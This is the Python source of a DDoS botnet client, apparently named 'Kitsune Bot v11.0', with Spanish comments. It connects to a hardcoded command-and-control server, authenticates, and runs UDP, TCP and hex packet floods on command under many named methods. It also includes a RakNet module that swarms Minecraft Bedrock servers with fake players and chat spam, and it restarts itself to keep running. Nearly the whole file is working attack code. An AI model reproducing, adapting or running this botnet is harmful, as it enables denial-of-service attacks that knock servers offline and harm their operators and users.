#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess, random, os, time, threading, socket, uuid, struct, sys, codecs, re, signal, zlib, hashlib, json, base64, math, string

if sys.stdout.encoding != 'UTF-8':
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# ─── CONFIGURACIÓN ─────────────────────────────────────────────────────────────
C2_ADDRESS = "137.74.136.147"
C2_PORT = 55064
RECONNECT_DELAY = 3
MAX_RETRIES_BEFORE_RESTART = 10000
HEARTBEAT_INTERVAL = 15

# ─── VARIABLES GLOBALES ──────────────────────────────────────────────────────
user_attacks = {}
active_attacks = {}
mcbot_bots = []
should_stop = False
bot_connected = False
main_sock = None
sock_lock = threading.Lock()
mcbot_lock = threading.Lock()
reconnect_attempts = 0
auth_completed = False
restart_count = 0
mcbot_running = False
mcbot_stop_event = threading.Event()

# ─── FUNCIONES SEGURAS ──────────────────────────────────────────────────────────
def safe_recv(sock, size=1024, timeout=10):
    try:
        sock.settimeout(timeout)
        data = sock.recv(size)
        if not data:
            return None
        return data.decode('utf-8', errors='ignore')
    except socket.timeout:
        return ""
    except Exception:
        return None

def safe_send(sock, data):
    try:
        if isinstance(data, str):
            sock.send(data.encode('utf-8', errors='ignore'))
        else:
            sock.send(data)
        return True
    except Exception:
        return False

# ─── UTILIDADES ──────────────────────────────────────────────────────────────
def get_architecture():
    try:
        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
        arch = result.decode().strip()
        arch = re.sub(r'[^a-zA-Z0-9_\-]', '', arch)
        return arch if arch else 'unknown'
    except:
        return 'unknown'

def get_bot_id():
    try:
        with open('/tmp/bot_id.txt', 'r') as f:
            return f.read().strip()
    except:
        bot_id = str(uuid.uuid4())[:8]
        try:
            with open('/tmp/bot_id.txt', 'w') as f:
                f.write(bot_id)
        except:
            pass
        return bot_id

# ─── MÉTODOS DE ATAQUE ──────────────────────────────────────────────────────
PACKET_SIZES = [512, 780, 1024, 1032]
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'

def attack_udp(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        end_time = time.time() + secs
        while time.time() < end_time and not stop_event.is_set() and not should_stop:
            try:
                packet = random._urandom(random.choice(PACKET_SIZES))
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

def attack_tcp(ip, port, secs, stop_event):
    end_time = time.time() + secs
    while time.time() < end_time and not stop_event.is_set() and not should_stop:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            start = time.time()
            while time.time() - start < 5 and not stop_event.is_set() and not should_stop:
                try:
                    sock.send(random._urandom(512))
                except:
                    break
            sock.close()
        except:
            pass

def attack_hex(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        end_time = time.time() + secs
        while time.time() < end_time and not stop_event.is_set() and not should_stop:
            try:
                sock.sendto(payload_hex, (ip, port))
            except:
                pass
    except:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

def attack_mcpe(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        end_time = time.time() + secs
        while time.time() < end_time and not stop_event.is_set() and not should_stop:
            try:
                sock.sendto(payload_mcpe, (ip, port))
            except:
                pass
    except:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

def lunch_attack(method, ip, port, secs, stop_event):
    methods = {
        '.UDP': attack_udp, '.TCP': attack_tcp, '.HEX': attack_hex, '.MCPE': attack_mcpe,
        '.UDPBYPASS': attack_udp, '.TCPOVH': attack_tcp, '.HTTPGET': attack_tcp,
        '.HTTPPOST': attack_tcp, '.BROWSER': attack_tcp, '.UDPFRAG': attack_udp,
        '.UDPGAME': attack_udp, '.UDPPPS': attack_udp, '.UDPQUERY': attack_udp,
        '.UDPBYPASSV2': attack_udp, '.OVHUDP': attack_udp, '.OVHTCP': attack_tcp,
        '.MIX': attack_tcp, '.SYN': attack_tcp, '.FIVEM': attack_mcpe,
        '.VSE': attack_mcpe, '.RAKNET': attack_mcpe, '.STDHEX': attack_hex,
    }
    if method in methods:
        methods[method](ip, port, secs, stop_event)

def start_attack(method, ip, port, duration, thread_count, username):
    stop_event = threading.Event()
    attack_id = f"{username}_{int(time.time())}"
    
    active_attacks[attack_id] = stop_event
    
    def run_attack():
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=lunch_attack, args=(method, ip, port, duration, stop_event), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    
    threading.Thread(target=run_attack, daemon=True).start()

    if username not in user_attacks:
        user_attacks[username] = []
    user_attacks[username].append((attack_id, stop_event, thread_count, method, ip, port, duration))
    
    return attack_id

def stop_attacks(username):
    if username in user_attacks:
        for attack_id, stop_event, _, _, _, _, _ in user_attacks[username][:]:
            stop_event.set()
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        user_attacks[username].clear()
        print(f"[+] Attacks stopped for {username}")

# ─── MCBOT MEJORADO CON PROTOCOLO CORREGIDO ───────────────────────────────

def random_mc_name(base):
    if base and base not in ['Bot', 'Steve', '']:
        return f"{base}{random.randint(100, 999)}"
    names = ['ProPlayer', 'xXDarkXx', 'Minecrafter', 'CraftKing', 'PixelWarrior',
             'DiamondHunt', 'RedstonePro', 'BuildMaster', 'SurvivalGuy', 'PvP_Legend']
    return f"{random.choice(names)}{random.randint(100, 999)}"

def random_pass_mc():
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(chars) for _ in range(8))

class MCPEBot:
    def __init__(self, host, port, name, register_cmd=None, mensajes=None, intervalo=5, stop_event=None):
        self.host = host
        self.port = int(port)
        self.name = random_mc_name(name)
        self.register_cmd = register_cmd
        self.mensajes = mensajes if mensajes else ['Hola!']
        self.intervalo = int(intervalo)
        self.running = True
        self.spawned = False
        self.sock = None
        self.entity_id = 0
        self.pos = {'x': 0.0, 'y': 64.0, 'z': 0.0}
        self.stop_event = stop_event or threading.Event()
        self.client_id = random.randint(1000000000, 9999999999)
        self.send_sequence = 0
        self.message_index = 0
        self.mtu_size = 1464
        
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.settimeout(5)
            self.sock.bind(('', 0))
            
            # Unconnected ping
            ping_packet = self._build_unconnected_ping()
            self.sock.sendto(ping_packet, (self.host, self.port))
            
            # Esperar pong
            start_time = time.time()
            got_pong = False
            while time.time() - start_time < 3 and not got_pong:
                try:
                    data, addr = self.sock.recvfrom(2048)
                    if data and data[0] == 0x1c:
                        got_pong = True
                        break
                except socket.timeout:
                    continue
            
            if not got_pong:
                print(f"[MCBot] {self.name} - No pong received")
                return False
            
            # Open connection request 1
            req1 = self._build_open_conn_req1()
            self.sock.sendto(req1, (self.host, self.port))
            
            # Esperar reply 1
            got_reply1 = False
            start_time = time.time()
            while time.time() - start_time < 3 and not got_reply1:
                try:
                    data, addr = self.sock.recvfrom(2048)
                    if data and data[0] == 0x06:
                        # Extraer MTU
                        if len(data) >= 18:
                            self.mtu_size = struct.unpack('>H', data[-2:])[0]
                        got_reply1 = True
                        break
                except socket.timeout:
                    continue
            
            if not got_reply1:
                print(f"[MCBot] {self.name} - No reply1 received")
                return False
            
            # Open connection request 2
            req2 = self._build_open_conn_req2()
            self.sock.sendto(req2, (self.host, self.port))
            
            # Esperar reply 2
            got_reply2 = False
            start_time = time.time()
            while time.time() - start_time < 3 and not got_reply2:
                try:
                    data, addr = self.sock.recvfrom(2048)
                    if data and data[0] == 0x08:
                        got_reply2 = True
                        break
                except socket.timeout:
                    continue
            
            if not got_reply2:
                print(f"[MCBot] {self.name} - No reply2 received")
                return False
            
            # Connection request ( encapsulated )
            conn_req = self._build_conn_request()
            self._send_encapsulated(conn_req)
            
            # Esperar connection accepted
            start_time = time.time()
            while time.time() - start_time < 5 and not self.stop_event.is_set():
                try:
                    data, addr = self.sock.recvfrom(2048)
                    if data:
                        self._handle_packet(data)
                        if self.spawned:
                            return True
                except socket.timeout:
                    continue
            
            return False
            
        except Exception as e:
            print(f"[MCBot] {self.name} - Connection error: {e}")
            return False
    
    def _build_unconnected_ping(self):
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        timestamp = int(time.time() * 1000)
        client_guid = random.getrandbits(64)
        return struct.pack('>B', 0x01) + struct.pack('>q', timestamp) + magic + struct.pack('>Q', client_guid)
    
    def _build_open_conn_req1(self):
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        mtu_pad = b'\x00' * 1463
        return struct.pack('>B', 0x05) + magic + struct.pack('>B', 7) + mtu_pad
    
    def _build_open_conn_req2(self):
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        # IP encoded
        ip_parts = self.host.split('.')
        ip_encoded = bytes([4] + [(~int(x)) & 0xff for x in ip_parts])
        return struct.pack('>B', 0x07) + magic + struct.pack('>B', 7) + ip_encoded + struct.pack('>H', self.port) + struct.pack('>Q', self.client_id) + struct.pack('>H', self.mtu_size)
    
    def _build_conn_request(self):
        # Login packet (0x09)
        login_data = struct.pack('>B', 0x09) + struct.pack('>Q', self.client_id) + struct.pack('>q', int(time.time() * 1000)) + struct.pack('>B', 0)
        return login_data
    
    def _build_login_packet(self):
        # Login (0x01) con datos del jugador
        username_bytes = self.name.encode('utf-8')
        protocol_version = 84  # MCPE 0.15.x
        
        # Chain data (simplified)
        chain_data = json.dumps({
            "chain": [
                json.dumps({
                    "extraData": {
                        "displayName": self.name,
                        "identity": str(uuid.uuid4()),
                        "XUID": ""
                    },
                    "identityPublicKey": "AAAA"
                })
            ]
        }).encode('utf-8')
        
        # Skin data
        skin_data = json.dumps({
            "ClientRandomId": self.client_id,
            "ServerAddress": f"{self.host}:{self.port}",
            "SkinData": "",
            "SkinId": "Standard_Custom",
            "DeviceOS": 1,
            "GameVersion": "0.15.10"
        }).encode('utf-8')
        
        # Construir login
        login = struct.pack('>B', 0xfe) + struct.pack('>B', 0x01)  # Batch + Login
        login += struct.pack('>I', protocol_version)
        
        # Body
        body = struct.pack('>I', len(chain_data)) + chain_data
        body += struct.pack('>I', len(skin_data)) + skin_data
        
        compressed = zlib.compress(body, 7)
        login += struct.pack('>I', len(compressed)) + compressed
        
        return login
    
    def _send_encapsulated(self, data, reliability=0):
        if not self.sock:
            return
        
        # Frame set packet
        self.send_sequence += 1
        seq = self.send_sequence
        
        # Encapsulated packet header
        flags = 0x60 | (reliability << 5)  # Reliable ordered
        bit_length = len(data) * 8
        
        packet = struct.pack('>B', 0x84)  # Frame set
        packet += struct.pack('>B', (seq >> 16) & 0xff)
        packet += struct.pack('>B', (seq >> 8) & 0xff)
        packet += struct.pack('>B', seq & 0xff)
        
        # Encapsulated
        packet += struct.pack('>B', flags)
        packet += struct.pack('>H', bit_length)
        packet += struct.pack('>B', (self.message_index >> 16) & 0xff)
        packet += struct.pack('>B', (self.message_index >> 8) & 0xff)
        packet += struct.pack('>B', self.message_index & 0xff)
        self.message_index += 1
        
        packet += struct.pack('>B', 0)  # Order index
        packet += struct.pack('>B', 0)  # Order index
        packet += struct.pack('>B', 0)  # Order channel
        
        packet += data
        
        try:
            self.sock.sendto(packet, (self.host, self.port))
        except:
            pass
    
    def _send_batch(self, packets):
        if not self.sock:
            return
        
        # Comprimir paquetes
        batch_data = b''
        for pkt in packets:
            batch_data += struct.pack('>I', len(pkt)) + pkt
        
        compressed = zlib.compress(batch_data, 7)
        
        # Batch packet (0xfe 0x06)
        batch = b'\xfe\x06' + struct.pack('>I', len(compressed)) + compressed
        
        self._send_encapsulated(batch)
    
    def _handle_packet(self, data):
        if not data:
            return
        
        packet_id = data[0]
        
        # Frame set
        if packet_id == 0x84 or packet_id == 0x88:
            self._handle_frame_set(data)
            return
        
        # ACK
        if packet_id == 0xc0:
            return
        
        # NACK
        if packet_id == 0xa0:
            return
    
    def _handle_frame_set(self, data):
        if len(data) < 4:
            return
        
        # Parse frame set
        seq = (data[1] << 16) | (data[2] << 8) | data[3]
        
        idx = 4
        while idx < len(data):
            if idx >= len(data):
                break
            
            flags = data[idx]
            idx += 1
            
            reliability = (flags >> 5) & 7
            has_split = (flags >> 4) & 1
            
            if idx + 2 > len(data):
                break
            
            bit_length = struct.unpack('>H', data[idx:idx+2])[0]
            idx += 2
            
            length = (bit_length + 7) // 8
            
            # Reliable fields
            if reliability in [2, 3, 4, 6, 7]:
                if idx + 3 > len(data):
                    break
                idx += 3  # message index
            
            if reliability in [1, 3, 4]:
                if idx + 4 > len(data):
                    break
                idx += 4  # order index + channel
            
            # Split
            if has_split:
                if idx + 10 > len(data):
                    break
                idx += 10
            
            if idx + length > len(data):
                break
            
            payload = data[idx:idx+length]
            idx += length
            
            self._handle_encapsulated(payload)
    
    def _handle_encapsulated(self, data):
        if not data:
            return
        
        # Check for batch
        if len(data) >= 2 and data[0] == 0xfe and data[1] == 0x06:
            # Decompress batch
            try:
                compressed_len = struct.unpack('>I', data[2:6])[0]
                compressed = data[6:6+compressed_len]
                decompressed = zlib.decompress(compressed)
                
                # Parse inner packets
                idx = 0
                while idx < len(decompressed):
                    if idx + 4 > len(decompressed):
                        break
                    pkt_len = struct.unpack('>I', decompressed[idx:idx+4])[0]
                    idx += 4
                    if idx + pkt_len > len(decompressed):
                        break
                    pkt = decompressed[idx:idx+pkt_len]
                    idx += pkt_len
                    self._handle_game_packet(pkt)
            except:
                pass
        else:
            self._handle_game_packet(data)
    
    def _handle_game_packet(self, data):
        if not data:
            return
        
        packet_id = data[0]
        
        # Play status (0x02)
        if packet_id == 0x02:
            if len(data) >= 5:
                status = struct.unpack('>i', data[1:5])[0]
                if status == 3:  # Player spawn
                    self.spawned = True
                    print(f"[MCBot] {self.name} - Spawned!")
            return
        
        # Start game (0x0b)
        if packet_id == 0x0b:
            if len(data) >= 30:
                try:
                    # Parse entity ID and position
                    self.entity_id = struct.unpack('>q', data[9:17])[0]
                    self.pos['x'] = struct.unpack('>f', data[25:29])[0]
                    self.pos['y'] = struct.unpack('>f', data[29:33])[0]
                    self.pos['z'] = struct.unpack('>f', data[33:37])[0]
                except:
                    pass
            return
        
        # Disconnect (0x05)
        if packet_id == 0x05:
            self.running = False
            return
    
    def _send_chunk_radius(self):
        return struct.pack('>B', 0x45) + struct.pack('>i', 8)
    
    def _send_move(self):
        self.pos['x'] += (random.random() - 0.5) * 0.5
        self.pos['z'] += (random.random() - 0.5) * 0.5
        
        pkt = struct.pack('>B', 0x13)  # Move player
        pkt += struct.pack('>q', self.entity_id)
        pkt += struct.pack('>f', self.pos['x'])
        pkt += struct.pack('>f', self.pos['y'])
        pkt += struct.pack('>f', self.pos['z'])
        pkt += struct.pack('>f', random.random() * 360)  # yaw
        pkt += struct.pack('>f', random.random() * 360)  # yaw
        pkt += struct.pack('>f', 0)  # pitch
        pkt += struct.pack('>B', 0)  # mode
        pkt += struct.pack('>B', 1)  # on ground
        return pkt
    
    def _send_chat(self, msg):
        if not msg:
            return None
        name = self.name.encode('utf-8')
        msg_bytes = msg.encode('utf-8')
        pkt = struct.pack('>B', 0x09)  # Text packet
        pkt += struct.pack('>B', 1)  # type: chat
        pkt += struct.pack('>H', len(name)) + name
        pkt += struct.pack('>H', len(msg_bytes)) + msg_bytes
        return pkt
    
    def run(self):
        if not self.connect():
            print(f"[MCBot] {self.name} - Failed to connect")
            return
        
        print(f"[MCBot] {self.name} - Connected, waiting for spawn...")
        
        # Send login packet
        login = self._build_login_packet()
        self._send_encapsulated(login)
        
        # Wait for spawn with timeout
        start_time = time.time()
        while not self.spawned and self.running and not self.stop_event.is_set():
            if time.time() - start_time > 15:
                print(f"[MCBot] {self.name} - Spawn timeout")
                break
            
            try:
                data, _ = self.sock.recvfrom(4096)
                if data:
                    self._handle_packet(data)
            except socket.timeout:
                # Send chunk radius request periodically
                if int(time.time()) % 2 == 0:
                    self._send_batch([self._send_chunk_radius()])
                continue
            except:
                break
        
        if not self.spawned:
            self.close()
            return
        
        print(f"[MCBot] {self.name} - Spawned! Starting actions...")
        
        # Send register command
        if self.register_cmd:
            msg = self.register_cmd
            if msg.startswith('/'):
                msg = f"{msg} {random_pass_mc()}"
            chat_pkt = self._send_chat(msg)
            if chat_pkt:
                self._send_batch([chat_pkt])
                print(f"[MCBot] {self.name} - Register: {msg}")
        
        # Main loop
        msg_idx = 0
        last_msg_time = time.time()
        last_move_time = time.time()
        
        while self.running and not self.stop_event.is_set():
            try:
                now = time.time()
                
                # Move every 0.5s
                if now - last_move_time > 0.5:
                    move_pkt = self._send_move()
                    self._send_batch([move_pkt])
                    last_move_time = now
                
                # Chat every intervalo
                if now - last_msg_time > self.intervalo and self.mensajes:
                    msg = self.mensajes[msg_idx % len(self.mensajes)]
                    chat_pkt = self._send_chat(msg)
                    if chat_pkt:
                        self._send_batch([chat_pkt])
                        print(f"[MCBot] {self.name} - Chat: {msg}")
                        msg_idx += 1
                    last_msg_time = now
                
                # Check for incoming
                try:
                    self.sock.settimeout(0.1)
                    data, _ = self.sock.recvfrom(4096)
                    if data:
                        self._handle_packet(data)
                except socket.timeout:
                    pass
                
                time.sleep(0.05)
                
            except Exception as e:
                print(f"[MCBot] {self.name} - Error: {e}")
                break
        
        self.close()
    
    def close(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None

def run_mcbot_attack(host, port, nombre, cantidad, tiempo, register_cmd, mensajes, intervalo):
    global mcbot_bots, mcbot_running, mcbot_stop_event
    
    try:
        cantidad = int(cantidad)
        tiempo = int(tiempo)
        intervalo = int(intervalo)
        
        mensajes_list = [m.strip().replace('-', ' ') for m in mensajes.split('|') if m.strip()] if mensajes else ['Hola!']
        
        print(f"[MCBot] Starting attack on {host}:{port}")
        print(f"[MCBot] Bots: {cantidad}, Time: {tiempo}s, Name: {nombre}")
        
        mcbot_stop_event.clear()
        mcbot_running = True
        
        bots = []
        threads_list = []
        
        def crear_bot(i):
            if mcbot_stop_event.is_set():
                return
            bot = MCPEBot(host, port, nombre, register_cmd, mensajes_list, intervalo, mcbot_stop_event)
            with mcbot_lock:
                mcbot_bots.append(bot)
            bots.append(bot)
            bot.run()
            with mcbot_lock:
                if bot in mcbot_bots:
                    mcbot_bots.remove(bot)
        
        for i in range(cantidad):
            if mcbot_stop_event.is_set():
                break
            t = threading.Thread(target=crear_bot, args=(i,), daemon=True)
            t.start()
            threads_list.append(t)
            time.sleep(0.3)
        
        if tiempo > 0:
            start_time = time.time()
            while time.time() - start_time < tiempo and not mcbot_stop_event.is_set():
                time.sleep(0.5)
        else:
            while not mcbot_stop_event.is_set():
                time.sleep(1)
        
        print(f"[MCBot] Attack completed or stopped")
        
        mcbot_stop_event.set()
        mcbot_running = False
        
        with mcbot_lock:
            for bot in mcbot_bots[:]:
                try:
                    bot.running = False
                    bot.close()
                except:
                    pass
            mcbot_bots.clear()
        
        return True
        
    except Exception as e:
        print(f"[MCBot] Error: {e}")
        mcbot_running = False
        return False

def stop_mcbot(name):
    global mcbot_bots, mcbot_running, mcbot_stop_event
    killed = 0
    
    mcbot_stop_event.set()
    mcbot_running = False
    
    with mcbot_lock:
        for bot in mcbot_bots[:]:
            try:
                bot.running = False
                bot.close()
                killed += 1
            except:
                pass
        mcbot_bots.clear()
    
    print(f"[+] MCBot stopped: {killed} bots")
    return killed

# ─── AUTENTICACIÓN DEL BOT ──────────────────────────────────────────────────

def authenticate_bot(c2, arch, bot_id):
    try:
        auth_step = 0
        buffer = ""
        start_time = time.time()
        
        while auth_step < 2 and not should_stop and time.time() - start_time < 30:
            data = safe_recv(c2, 1024, 5)
            if data is None:
                return False
            if data == "":
                time.sleep(0.3)
                continue
            
            buffer += data
            
            if 'Username' in buffer or '❯' in buffer or 'username' in buffer.lower():
                if auth_step == 0:
                    auth_data = f"{arch}|{bot_id}\n"
                    if not safe_send(c2, auth_data):
                        return False
                    print(f"[*] Sent: {auth_data.strip()}")
                    auth_step = 1
                    buffer = ""
            
            if 'Password' in buffer or 'password' in buffer.lower():
                if auth_step == 1:
                    if not safe_send(c2, 'BOT_PASSWORD\n'):
                        return False
                    print("[*] Sent: BOT_PASSWORD")
                    auth_step = 2
                    buffer = ""
        
        return auth_step == 2
        
    except Exception as e:
        print(f"[!] Auth error: {e}")
        return False

# ─── HEARTBEAT THREAD ───────────────────────────────────────────────────────

def heartbeat_thread(c2_sock):
    while bot_connected and not should_stop:
        try:
            if time.time() % HEARTBEAT_INTERVAL < 1:
                if not safe_send(c2_sock, '\n'):
                    break
        except:
            break
        time.sleep(1)

# ─── FUNCIÓN PARA REINICIAR EL BOT ─────────────────────────────────────────

def restart_bot():
    global restart_count
    restart_count += 1
    
    print(f"\n🔄 RESTARTING BOT - Attempt #{restart_count}")
    print("=" * 50)
    
    stop_mcbot("all")
    stop_attacks("all")
    
    with sock_lock:
        try:
            if main_sock:
                main_sock.close()
        except:
            pass
    
    time.sleep(2)
    
    script_path = os.path.abspath(__file__)
    try:
        python_path = sys.executable
        subprocess.Popen([python_path, script_path])
        print("[+] Bot restarted successfully")
        os._exit(0)
    except Exception as e:
        print(f"[-] Restart error: {e}")
        try:
            os.execv(sys.executable, [sys.executable, script_path])
        except:
            print("[-] Could not restart, exiting...")
            os._exit(1)

# ─── CERRAR SOCKETS Y LIMPIAR ─────────────────────────────────────────────

def cleanup_connection():
    global main_sock, bot_connected, auth_completed
    
    bot_connected = False
    auth_completed = False
    
    with sock_lock:
        if main_sock:
            try:
                main_sock.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                main_sock.close()
            except:
                pass
            main_sock = None

# ─── BUCLE PRINCIPAL CON RECONEXIÓN ─────────────────────────────────────────

def main_loop():
    global should_stop, bot_connected, main_sock, reconnect_attempts, auth_completed
    
    bot_id = get_bot_id()
    arch = get_architecture()
    
    while not should_stop:
        c2 = None
        try:
            print(f"[*] Connecting to {C2_ADDRESS}:{C2_PORT}...")
            
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
            c2.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
            c2.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
            c2.settimeout(30)
            
            c2.connect((C2_ADDRESS, C2_PORT))
            
            reconnect_attempts = 0
            
            with sock_lock:
                main_sock = c2
            
            bot_connected = True
            print("[+] Connected!")

            auth_completed = authenticate_bot(c2, arch, bot_id)
            
            if not auth_completed:
                raise Exception("Auth failed - timeout")
            
            print('✅ Authenticated!')
            
            hb_thread = threading.Thread(target=heartbeat_thread, args=(c2,), daemon=True)
            hb_thread.start()
            
            last_heartbeat = time.time()
            
            while not should_stop and bot_connected:
                try:
                    data = safe_recv(c2, 4096, 60)
                    
                    if data is None:
                        print("[!] Connection closed by server")
                        break
                    
                    if data == "":
                        if time.time() - last_heartbeat > HEARTBEAT_INTERVAL:
                            if not safe_send(c2, 'PONG\n'):
                                break
                            last_heartbeat = time.time()
                        continue
                    
                    print(f"📨 {data[:80]}...")
                    last_heartbeat = time.time()
                    
                    args = data.strip().split(' ')
                    command = args[0].upper()

                    if command == 'PING':
                        safe_send(c2, 'PONG\n')
                    
                    elif command == 'STOP':
                        username = args[1] if len(args) > 1 else "default"
                        print(f"[*] STOP received for {username}")
                        stop_attacks(username)
                        stop_mcbot(username)
                        safe_send(c2, f"[+] Attacks stopped for {username}\n")
                    
                    elif command == '.MCBOT':
                        if len(args) < 9:
                            safe_send(c2, "[-] Missing arguments\n")
                            continue
                        
                        host = args[1]
                        port = args[2]
                        nombre = args[3]
                        cantidad = args[4]
                        tiempo = args[5]
                        register_cmd = args[6]
                        mensajes = args[7]
                        intervalo = args[8]
                        
                        print(f"[*] MCBot: {host}:{port} | {nombre} | {cantidad} bots | {tiempo}s")
                        
                        mcbot_thread = threading.Thread(
                            target=run_mcbot_attack,
                            args=(host, port, nombre, cantidad, tiempo, register_cmd, mensajes, intervalo),
                            daemon=True
                        )
                        mcbot_thread.start()
                        
                        safe_send(c2, f"[+] MCBot started with {cantidad} bots\n")
                        
                    elif command.startswith('.'):
                        try:
                            method = command
                            ip = args[1]
                            port = int(args[2])
                            secs = int(args[3])
                            threads_atk = int(args[4]) if len(args) >= 5 else 1
                            username_atk = args[5] if len(args) >= 6 else "default"
                            if threads_atk > 3:
                                threads_atk = 3
                            print(f"[*] Attacking {ip}:{port} with {method}")
                            start_attack(method, ip, port, secs, threads_atk, username_atk)
                        except Exception as e:
                            print(f"[-] Attack error: {e}")
                            
                except socket.timeout:
                    continue
                except socket.error as e:
                    print(f"[!] Socket error: {e}")
                    break
                except Exception as e:
                    print(f"[!] Command error: {e}")
                    continue
                    
        except socket.error as e:
            print(f"[!] Connection error: {e}")
        except Exception as e:
            print(f"❌ Error: {e}")
        finally:
            cleanup_connection()
        
        if not should_stop:
            reconnect_attempts += 1
            
            if reconnect_attempts >= MAX_RETRIES_BEFORE_RESTART:
                print(f"\n⚠️ {reconnect_attempts} failed reconnection attempts")
                print("🔄 Restarting process...")
                restart_bot()
                return
            
            wait = RECONNECT_DELAY + random.uniform(0, 2)
            print(f"[*] Reconnecting in {wait:.1f}s (attempt {reconnect_attempts})")
            time.sleep(wait)

# ─── INICIO ─────────────────────────────────────────────────────────────────

def signal_handler(sig, frame):
    global should_stop
    print("\n🛑 Signal received, stopping...")
    should_stop = True
    stop_mcbot("all")
    stop_attacks("all")
    cleanup_connection()
    sys.exit(0)

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════╗
    ║         KITSUNE BOT - v11.0              ║
    ║    MCBot Fixed - Reconnection Fixed      ║
    ╚══════════════════════════════════════════╝
    """)
    
    print(f"[*] Bot ID: {get_bot_id()}")
    print(f"[*] Arch: {get_architecture()}")
    print(f"[*] C2: {C2_ADDRESS}:{C2_PORT}")
    print(f"[*] Max retries: {MAX_RETRIES_BEFORE_RESTART}")
    print()
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    while not should_stop:
        try:
            main_loop()
        except KeyboardInterrupt:
            print("\n🛑 Stopped")
            break
        except Exception as e:
            print(f"Main error: {e}")
            time.sleep(3)
    
    print("👋 Bot finished")
